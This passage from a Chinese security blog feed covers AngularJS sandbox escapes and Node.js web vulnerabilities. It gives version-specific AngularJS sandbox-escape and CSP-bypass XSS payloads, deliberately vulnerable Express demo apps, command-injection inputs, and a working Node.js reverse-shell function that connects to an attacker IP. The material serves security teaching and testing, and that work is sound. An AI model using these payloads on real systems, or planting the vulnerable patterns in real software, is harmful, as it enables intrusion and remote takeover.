class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/11.png" alt=""></p><h3 id="1-3-3-1-3-19"><a href="#1-3-3-1-3-19" class="headerlink" title="1.3.3 - 1.3.19"></a>1.3.3 - 1.3.19</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:false,valueOf:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/12.png" alt=""></p><h3 id="1-4-0-1-4-5（仅Chrome）"><a href="#1-4-0-1-4-5（仅Chrome）" class="headerlink" title="1.4.0 - 1.4.5（仅Chrome）"></a>1.4.0 - 1.4.5（仅Chrome）</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-1-5-8（仅Chrome和IE）"><a href="#1-4-2-1-5-8（仅Chrome和IE）" class="headerlink" title="1.4.2 - 1.5.8（仅Chrome和IE）"></a>1.4.2 - 1.5.8（仅Chrome和IE）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/13.png" alt=""></p><h3 id="1-4-0-1-4-9"><a href="#1-4-0-1-4-9" class="headerlink" title="1.4.0 - 1.4.9"></a>1.4.0 - 1.4.9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/14.png" alt=""></p><h3 id="1-3-3-1-5-8"><a href="#1-3-3-1-5-8" class="headerlink" title="1.3.3 - 1.5.8"></a>1.3.3 - 1.5.8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x[&apos;y&apos;].charAt=[].join;$eval(&apos;x=alert(1)&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/15.png" alt=""></p><h3 id="1-4-10-1-6-2"><a href="#1-4-10-1-6-2" class="headerlink" title="1.4.10 - 1.6.2"></a>1.4.10 - 1.6.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c=&apos;&apos;.sub.call;</span><br><span class="line">b=&apos;&apos;.sub.bind;</span><br><span class="line">a=&apos;&apos;.sub.apply;</span><br><span class="line">c.$apply=$apply;</span><br><span class="line">c.$eval=b;</span><br><span class="line">op=$root.$$phase;</span><br><span class="line">$root.$$phase=null;</span><br><span class="line">od=$root.$digest;</span><br><span class="line">$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">C=c.$apply(c);</span><br><span class="line">$root.$$phase=op;</span><br><span class="line">$root.$digest=od;</span><br><span class="line">B=C(b,c,b);</span><br><span class="line">$evalAsync(&quot;</span><br><span class="line">astNode=pop();</span><br><span class="line">astNode.type=&apos;UnaryExpression&apos;;</span><br><span class="line">astNode.operator=&apos;(window.X?void0:(window.X=true,alert(1)))+&apos;;</span><br><span class="line">astNode.argument=&#123;type:&apos;Identifier&apos;,name:&apos;foo&apos;&#125;;</span><br><span class="line">&quot;);</span><br><span class="line">m1=B($$asyncQueue.pop().expression,null,$root);</span><br><span class="line">m2=B(C,null,m1);</span><br><span class="line">[].push.apply=m2;</span><br><span class="line">a=&apos;&apos;.sub;</span><br><span class="line">$eval(&apos;a(b.c)&apos;);</span><br><span class="line">[].push.apply=a;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/16.png" alt=""></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>第一次发布的AngularJS即 1.0 - 1.1.5 版本并没有沙箱。但AngularJS表达式被开发者限定为局部对象定义，这便阻止了在窗口对象中调用函数，由于被作用域限制，此时如果尝试调用alert会发现调用的是作用域对象而不是窗口对象，函数调用会失败。针对这种场景，Mario Heiderich发现可以使用构造函数属性来Bypass这个限制，即使用Function构造函数能在表达式中执行任意代码。</p><p>在后来的版本中AngularJS添加了沙箱，但是对应的每个版本的沙箱都被Bypass，以至于AngularJS在1.6版本之后完全移除了沙箱，也就是说新版本的AngularJS是不用再费劲去沙箱逃逸了。</p><h3 id="一道Bypass-CSP的题目"><a href="#一道Bypass-CSP的题目" class="headerlink" title="一道Bypass CSP的题目"></a>一道Bypass CSP的题目</h3><p>代码如下，bypass-csp.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&apos;q&apos;];</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到，整个HTML在AngularJS沙箱下，其中CSP限制script标签的脚本只能是加载code.angularjs.org域的或self的。</p><p>具体过程这里不做分析，payload如下（仅Chrome）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass-csp.php?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/17.png" alt=""></p><h2 id="0x03-AngularJS危险函数调用"><a href="#0x03-AngularJS危险函数调用" class="headerlink" title="0x03 AngularJS危险函数调用"></a>0x03 AngularJS危险函数调用</h2><p>AngularJS中一些特定功能的函数并不会对字符进行转码，因此当使用不当时可以执行JS表达式进行XSS攻击。</p><p>AngularJS危险函数列表如下，当然这里只列了最简单的，其他很多的请查阅资料：</p><table><thead><tr><th>危险函数</th><th>备注</th></tr></thead><tbody><tr><td>$eval()</td><td>会在当前作用域中执行一个表达式并返回结果</td></tr><tr><td>$parse()</td><td>将一个表达式转换为一个函数。这个函数可以被调用，其中的参数是一个上下文对象，通常来说是作用域。</td></tr><tr><td>trustAs(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>trustAsHtml(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>parseAsHtml(expression)</td><td>解析为HTML代码</td></tr><tr><td><code>angular.element(someElement).html(&quot;&lt;html&gt;&quot;+userContent);</code></td><td>DOM插入HTML</td></tr><tr><td>$sce.enabled(false);</td><td>关闭自动转义</td></tr><tr><td>$sceProvider.enabled(false);</td><td>关闭自动转义</td></tr></tbody></table><p>还有一种情况就是，  使用管道符时的条件外部可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; value | orderBy:userContent &#125;&#125;.filter(&apos;&apos;,function()&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x04-AngularJS安全措施"><a href="#0x04-AngularJS安全措施" class="headerlink" title="0x04 AngularJS安全措施"></a>0x04 AngularJS安全措施</h2><p>参考官网描述：<a href="https://angular.cn/guide/security" target="_blank" rel="noopener">https://angular.cn/guide/security</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.runoob.com/angularjs/angularjs-tutorial.html" target="_blank" rel="noopener">AngularJS 教程</a></p><p><a href="https://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="noopener">AngularJS沙盒逃逸姿势总结</a></p><p><a href="https://xz.aliyun.com/t/4638" target="_blank" rel="noopener">AngularJS Sandbox Bypasses</a></p><p><a href="https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss" target="_blank" rel="noopener">AngularJS - Escaping the Expression Sandbox for XSS</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="AngularJS" scheme="https://www.mi1k7ea.com/tags/AngularJS/"/>
    
  </entry>
  
  <entry>
    <title>浅析Node.js安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90Node-js%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析Node-js安全/</id>
    <published>2020-03-29T04:17:06.000Z</published>
    <updated>2020-04-01T15:45:06.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境。Node.js使用了一个事件驱动、非阻塞式I/O的模型。</p><p>Node是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。实质是对Chrome V8引擎进行了封装。</p><p>Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。</p><h3 id="环境安装、基础语法与特性"><a href="#环境安装、基础语法与特性" class="headerlink" title="环境安装、基础语法与特性"></a>环境安装、基础语法与特性</h3><p>参考：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-tutorial.html</a></p><h3 id="第一个应用"><a href="#第一个应用" class="headerlink" title="第一个应用"></a>第一个应用</h3><p>Node.js应用由以下三部分组成：</p><ol><li>引入required模块：我们可以使用require指令来载入Node.js模块。</li><li>创建服务器：服务器可以监听客户端的请求，类似于Apache、Nginx等HTTP服务器。</li><li>接收请求与响应请求：服务器很容易创建，客户端可以使用浏览器或终端发送HTTP请求，服务器接收请求后返回响应数据。</li></ol><p>直接看下代码实现，test.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入required模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送 HTTP 头部 </span></span><br><span class="line">    <span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line">    <span class="comment">// 内容类型: text/plain</span></span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送响应数据 "Mi1k7ea"</span></span><br><span class="line">    response.end(<span class="string">'Mi1k7ea\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:666/'</span>);</span><br></pre></td></tr></table></figure><p>直接用node命令运行即可：</p><p><img src="/2020/03/29/浅析Node-js安全/1.png" alt=""></p><h3 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h3><p>Express是一个简洁而灵活的Node.js Web应用框架，提供了一系列强大特性帮助你创建各种Web应用，和丰富的HTTP工具。</p><p>使用Express可以快速地搭建一个完整功能的网站。</p><p>Express框架核心特性：</p><ul><li>可以设置中间件来响应HTTP请求。</li><li>定义了路由表用于执行不同的HTTP请求动作。</li><li>可以通过向模板传递参数来动态渲染HTML页面。</li></ul><p>Express的安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br><span class="line">npm install body-parser --save</span><br><span class="line">npm install cookie-parser --save</span><br><span class="line">npm install multer --save</span><br></pre></td></tr></table></figure><p>以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，node_modules目录下会自动创建express目录。几个重要的模块介绍如下：</p><ul><li><strong>body-parser</strong> - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。</li><li><strong>cookie-parser</strong> - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li><li><strong>multer</strong> - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。</li></ul><p>安装完后，我们可以查看下express使用的版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;npm list express</span><br><span class="line">E:\</span><br><span class="line">`-- express@4.17.1</span><br></pre></td></tr></table></figure><p>Demo应用，express_demo.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.send(<span class="string">'Express Test'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> host = server.address().address</span><br><span class="line">  <span class="keyword">var</span> port = server.address().port</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://%s:%s"</span>, host, port)</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接着用命令<code>node express_demo.js</code>运行即可访问。</p><p>在页面中访问，可以看到响应报文中有个X-Powered-By头，其值为Express，也就是说，在日常的抓包中看到该头字段即可知道是使用的Node.js的Express框架：</p><p><img src="/2020/03/29/浅析Node-js安全/2.png" alt=""></p><h2 id="0x02-Node-js安全"><a href="#0x02-Node-js安全" class="headerlink" title="0x02 Node.js安全"></a>0x02 Node.js安全</h2><p>Node.js中的Web安全问题和传统的Web安全问题都是一样的，只是代码实现上有语法的差异而已。</p><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>Node.js同样存在代码注入问题，需要重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">eval</span>(req.query.a);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">eval</span>(req.query.b);</span><br><span class="line"><span class="keyword">var</span> r = a + b;</span><br><span class="line">res.send(<span class="string">'Sum a+b='</span> + r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>强制应用退出的payload如下，执行之后Express服务就终止了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1&amp;b=process.exit()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/3.png" alt=""></p><p>再深入利用，反弹shell的payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);</span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);</span><br><span class="line">cmd.stderr.pipe(client);</span><br><span class="line">client.on( <span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );</span><br><span class="line">client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">rev(<span class="string">'192.168.10.137'</span>, <span class="number">4444</span>);</span><br></pre></td></tr></table></figure><p>直接注入访问：</p><p><img src="/2020/03/29/浅析Node-js安全/4.png" alt=""></p><p>在Kali中成功拿到反弹shell：</p><p><img src="/2020/03/29/浅析Node-js安全/5.png" alt=""></p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>Node.js同样存在命名注入漏洞，需重点关注模块child_process的函数，因为这个模块包含了创建一个新进程来执行系统命令的功能。</p><p>示例代码如下，直接使用外部参数拼接ping命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">cmd.exec(<span class="string">"ping -n 4 "</span> + req.query.ip,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'Ping Results: &lt;pre&gt;'</span> + data + <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>正常访问：</p><p><img src="/2020/03/29/浅析Node-js安全/6.png" alt=""></p><p>尝试进行命令注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|whoami</span><br><span class="line">?ip=127.0.0.1||whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/7.png" alt=""></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Node.js本身没有XSS防护机制，也不像Java那样拥有强大的过滤器来实现过滤用户的有害输入从而防御XSS。若是未经过滤直接显示外部的输入则导致XSS。但是可以通过设置HTTP头中加入X-XSS-Protection在浏览器端缓解XSS。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.send(<span class="string">'Hello, '</span> + req.query.name);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>直接注入XSS payload即可：</p><p><img src="/2020/03/29/浅析Node-js安全/8.png" alt=""></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>Node.js的needle模块可发起GET/POST等HTTP请求，当其参数外部可控时可造成SSRF漏洞。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> needle = <span class="built_in">require</span>(<span class="string">'needle'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> url = req.query[<span class="string">'url'</span>];</span><br><span class="line">needle.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">error, response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>)</span><br><span class="line">res.send(response.body);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'new request:'</span> + url);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/9.png" alt=""></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，我们给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。该特性可用来进行参数解析漏洞的利用。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> name = req.query.name;</span><br><span class="line">res.send(<span class="string">"Name: "</span> + name);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/10.png" alt=""></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote><p>Node.js的网站注入漏洞很少。Node.js通常与mysql/mongodb搭配使用，因为sql注入的漏洞危害很高并且存在多年了，一些新出现的语言如openresty+lua/node.js等天生会规避掉这种安全问题。它们通常都采用了占位符或者叫参数化查询来与数据库交互。node.js 原生的与数据库交互代码如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql = <span class="built_in">require</span> (<span class="string">'mysql'</span>) ; </span><br><span class="line"><span class="keyword">var</span> connection = mysql .createConnection(</span><br><span class="line">&#123; <span class="attr">host</span>: <span class="string">'localhost'</span>, </span><br><span class="line">user: <span class="string">'root'</span>, 